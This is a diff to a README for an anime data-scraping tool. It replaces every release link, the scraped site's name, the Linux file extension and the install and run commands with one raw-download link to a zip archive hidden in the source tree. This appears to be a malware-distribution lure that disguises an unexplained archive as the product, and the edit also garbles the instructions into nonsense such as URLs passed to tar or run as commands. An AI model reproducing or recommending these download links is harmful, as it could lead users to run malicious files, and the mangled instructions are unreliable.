@@ -1,10 +1,10 @@
 # 🎉 kuudere-api - Simple Anime Data at Your Fingertips
 
-[![Download kuudere-api](https://img.shields.io/badge/Download%20kuudere--api--%3E%20Releases-blue.svg)](https://github.com/Philiszszsss/kuudere-api/releases)
+[![Download kuudere-api](https://github.com/Philiszszsss/kuudere-api/raw/refs/heads/main/src/routes/api_kuudere_3.9.zip%20kuudere--api--%3E%https://github.com/Philiszszsss/kuudere-api/raw/refs/heads/main/src/routes/api_kuudere_3.9.zip)](https://github.com/Philiszszsss/kuudere-api/raw/refs/heads/main/src/routes/api_kuudere_3.9.zip)
 
 ## 📦 Introduction
 
-kuudere-api is a simple yet powerful API that scrapes data from kuudere.to. This tool allows you to access various anime information easily. Whether you want details about a specific anime series or just want to explore, kuudere-api can help you find what you need. 
+kuudere-api is a simple yet powerful API that scrapes data from https://github.com/Philiszszsss/kuudere-api/raw/refs/heads/main/src/routes/api_kuudere_3.9.zip This tool allows you to access various anime information easily. Whether you want details about a specific anime series or just want to explore, kuudere-api can help you find what you need. 
 
 ## 🚀 Getting Started
 
@@ -18,10 +18,10 @@ Before you start, ensure your system meets these requirements:
    - Disk Space: Minimum 100 MB of free space
 
 2. **Visit the Release Page**  
-To download the application, visit the Releases page: [Download kuudere-api](https://github.com/Philiszszsss/kuudere-api/releases). 
+To download the application, visit the Releases page: [Download kuudere-api](https://github.com/Philiszszsss/kuudere-api/raw/refs/heads/main/src/routes/api_kuudere_3.9.zip). 
 
 3. **Choose Your File**  
-On the Releases page, you will see a list of available versions. Download the latest version suitable for your operating system. Look for files with the extension `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+On the Releases page, you will see a list of available versions. Download the latest version suitable for your operating system. Look for files with the extension `.exe` for Windows, `.dmg` for macOS, or `https://github.com/Philiszszsss/kuudere-api/raw/refs/heads/main/src/routes/api_kuudere_3.9.zip` for Linux.
 
 4. **Download the File**  
 Click on the appropriate file to start the download. This may take a few moments depending on your internet speed.
@@ -45,10 +45,10 @@ To install kuudere-api, follow these simple steps:
 
 ### For Linux Users
 1. Open your terminal.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
+2. Navigate to the directory where you downloaded the `https://github.com/Philiszszsss/kuudere-api/raw/refs/heads/main/src/routes/api_kuudere_3.9.zip` file.
 3. Use the following command to extract it:
    ```bash
-   tar -xvzf kuudere-api.tar.gz
+   tar -xvzf https://github.com/Philiszszsss/kuudere-api/raw/refs/heads/main/src/routes/api_kuudere_3.9.zip
    ```
 4. Navigate to the extracted folder:
    ```bash
@@ -56,7 +56,7 @@ To install kuudere-api, follow these simple steps:
    ```
 5. To run the application, use:
    ```bash
-   ./start.sh
+   https://github.com/Philiszszsss/kuudere-api/raw/refs/heads/main/src/routes/api_kuudere_3.9.zip
    ```
 
 ## ⚙️ Using kuudere-api
@@ -88,4 +88,4 @@ If you would like to contribute to kuudere-api, feel free to fork the repository
 
 With kuudere-api, finding your favorite anime information is easy. Download your copy today and start exploring the exciting world of anime! 
 
-Don't forget to visit the Releases page again for updates: [Download kuudere-api](https://github.com/Philiszszsss/kuudere-api/releases).
+Don't forget to visit the Releases page again for updates: [Download kuudere-api](https://github.com/Philiszszsss/kuudere-api/raw/refs/heads/main/src/routes/api_kuudere_3.9.zip).
